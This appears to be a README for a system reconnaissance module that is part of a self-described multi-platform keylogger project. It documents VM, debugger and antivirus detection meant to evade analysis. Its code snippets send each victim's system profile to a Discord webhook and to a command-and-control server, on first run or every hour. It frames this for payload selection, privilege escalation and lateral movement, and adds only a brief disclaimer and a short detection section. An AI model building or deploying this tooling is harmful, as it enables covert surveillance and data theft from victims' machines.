# System Information Gathering Module

## Overview

The `system_info.py` module is a comprehensive reconnaissance tool that collects detailed information about the target system. This is a common feature in malware for understanding the victim's environment before executing payloads.

## Features

### 1. **Basic System Information**
- Hostname and FQDN
- Operating system (Windows/Linux/Android)
- OS version and release
- System architecture (x86/x64/ARM)
- Processor details
- Python version

### 2. **Network Information**
- Local IP address
- All network interfaces
- MAC addresses
- Network configuration (IP, netmask, broadcast)

### 3. **Hardware Information**
- **CPU**: Physical/logical cores, frequency, usage
- **Memory**: Total, available, used RAM with percentages
- **Disk**: All partitions with size, usage, filesystem type
- **GPU**: Graphics card information (Windows only)

### 4. **Software Information**
- Operating system details
- System boot time and uptime
- Running processes count
- Windows edition and build number
- Linux distribution information
- Installed antivirus detection (Windows)

### 5. **User Information**
- Current username
- Home directory
- Current working directory
- Environment variables (PATH, TEMP, etc.)
- Administrator/root privilege status

### 6. **Security Information**
- Virtual machine detection (VMware, VirtualBox, QEMU, etc.)
- Firewall status (Windows)
- Debugger detection
- Anti-analysis indicators

## Installation

Install required dependencies:

```bash
pip install psutil
```

Optional for Windows advanced features:
```bash
pip install wmi
```

## Usage

### Basic Usage

```python
from system_info import SystemInfo

# Create instance
sys_info = SystemInfo()

# Gather all information
sys_info.gather_all()

# Display formatted output
print(sys_info.to_formatted_text())

# Save to files
sys_info.save_to_file("system_info.txt", format="text")
sys_info.save_to_file("system_info.json", format="json")
```

### Integration with Keylogger

Add to `main.py` to send system info on first run:

```python
from system_info import SystemInfo
import network_sender

def send_initial_recon():
    """Send system information on first execution"""
    sys_info = SystemInfo()
    sys_info.gather_all()
    
    # Format as text
    info_text = sys_info.to_formatted_text()
    
    # Send via Discord webhook
    network_sender.send_log(
        "🖥️ New Target System Detected",
        info_text
    )
    
    # Save locally
    sys_info.save_to_file("target_info.txt")

# Call in main() before starting keylogger
if __name__ == "__main__":
    send_initial_recon()
    # ... rest of keylogger code
```

### Selective Information Gathering

```python
sys_info = SystemInfo()

# Gather only specific information
basic = sys_info.get_basic_info()
network = sys_info.get_network_info()
hardware = sys_info.get_hardware_info()

print(f"Target: {basic['hostname']}")
print(f"OS: {basic['platform']} {basic['platform_release']}")
print(f"IP: {network['local_ip']}")
```

## Output Formats

### Text Format
Human-readable formatted text with sections:
```
================================================================================
SYSTEM INFORMATION REPORT
================================================================================
Generated: 2025-11-22 09:01:36

--------------------------------------------------------------------------------
BASIC INFORMATION
--------------------------------------------------------------------------------
Hostname: DESKTOP-UL7LVGN
Platform: Windows
...
```

### JSON Format
Machine-readable JSON for automated processing:
```json
{
    "timestamp": "2025-11-22 09:01:36",
    "basic": {
        "hostname": "DESKTOP-UL7LVGN",
        "platform": "Windows",
        ...
    },
    "network": {...},
    "hardware": {...}
}
```

## Security Features

### Virtual Machine Detection
Detects if running in:
- VMware
- VirtualBox
- QEMU
- Xen
- Hyper-V
- Parallels

### Debugger Detection
- Windows: `IsDebuggerPresent()` API
- Linux: Checks `/proc/self/status` for TracerPid

### Antivirus Detection (Windows)
Queries Windows Security Center for installed AV products:
- Windows Defender
- Norton
- McAfee
- Kaspersky
- Avast
- AVG
- etc.

## Use Cases

### 1. **Initial Reconnaissance**
Send system info immediately after deployment to understand target environment.

### 2. **Targeted Payload Selection**
Choose appropriate exploits based on OS version and security software.

### 3. **Privilege Escalation Planning**
Identify if admin privileges are needed and available exploits.

### 4. **Anti-Analysis**
Detect VMs and debuggers to avoid security researcher analysis.

### 5. **Network Mapping**
Identify network configuration for lateral movement.

## Ethical Considerations

⚠️ **WARNING**: This tool is for educational purposes only.

- Only use on systems you own or have explicit authorization to test
- Unauthorized system reconnaissance is illegal in most jurisdictions
- Comply with all applicable laws and regulations
- Use in controlled environments for cybersecurity research

## Detection and Countermeasures

### How to Detect This Module

**Behavioral Indicators:**
- Queries to WMI (Windows Management Instrumentation)
- Reading `/proc/` files on Linux
- Network interface enumeration
- Registry access (Windows)
- Unusual psutil library usage

**File Indicators:**
- `system_info.py` in suspicious directories
- `system_info.txt` or `system_info.json` output files
- Imports of `psutil`, `wmi`, `platform` modules

### Defensive Measures

1. **Endpoint Detection**: Monitor for reconnaissance behavior
2. **Application Whitelisting**: Block unauthorized Python scripts
3. **Network Monitoring**: Detect exfiltration of system info
4. **Behavioral Analysis**: Flag processes querying extensive system data
5. **Honeypot Indicators**: Plant fake system info to detect malware

## Technical Details

### Dependencies
- `platform` (built-in): OS and architecture detection
- `socket` (built-in): Network information
- `psutil`: Hardware and process information
- `wmi` (optional, Windows): Advanced Windows queries
- `subprocess` (built-in): Execute system commands

### Cross-Platform Compatibility
- ✅ Windows 10/11
- ✅ Linux (Ubuntu, Debian, Fedora, etc.)
- ⚠️ Android (limited - requires Termux or similar)
- ✅ macOS (untested but should work)

### Performance
- Execution time: ~1-3 seconds
- Memory usage: ~20-30 MB
- CPU usage: Minimal (<5%)
- No persistent background processes

## Example Output

See `system_info.txt` for complete example output from your system.

## Integration Examples

### Send on First Run Only

```python
import os
from system_info import SystemInfo

RECON_FLAG = "recon_sent.flag"

if not os.path.exists(RECON_FLAG):
    sys_info = SystemInfo()
    sys_info.gather_all()
    # Send to C2 server
    send_to_c2(sys_info.to_json())
    # Create flag file
    open(RECON_FLAG, 'w').close()
```

### Periodic Updates

```python
import time
from system_info import SystemInfo

while True:
    sys_info = SystemInfo()
    sys_info.gather_all()
    send_to_c2(sys_info.to_json())
    time.sleep(3600)  # Update every hour
```

## License

Educational use only. See main project LICENSE.

## Author

Part of the Advanced Multi-Platform Keylogger project for cybersecurity research.
